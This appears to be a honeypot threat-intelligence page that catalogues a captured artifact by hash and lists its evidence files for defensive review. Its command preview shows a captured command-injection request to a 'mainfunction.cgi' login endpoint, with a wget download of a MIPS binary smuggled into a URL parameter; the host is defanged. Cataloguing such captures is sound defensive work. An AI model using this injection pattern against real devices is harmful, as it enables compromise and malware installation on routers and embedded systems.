# 20b5c42fd1280597e6d02c2bba17327396a0c09e9daa6394edb4fe825e833c49

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `20b5c42fd1280597e6d02c2bba17327396a0c09e9daa6394edb4fe825e833c49` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /cgibin/mainfunction.cgi&action=login&keyPath=wget+http%3A%2F%2F31[.]56[.]39.XXX%2Fmemory_bin_dir%2Fmemory_load[.]mips+%3B+
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
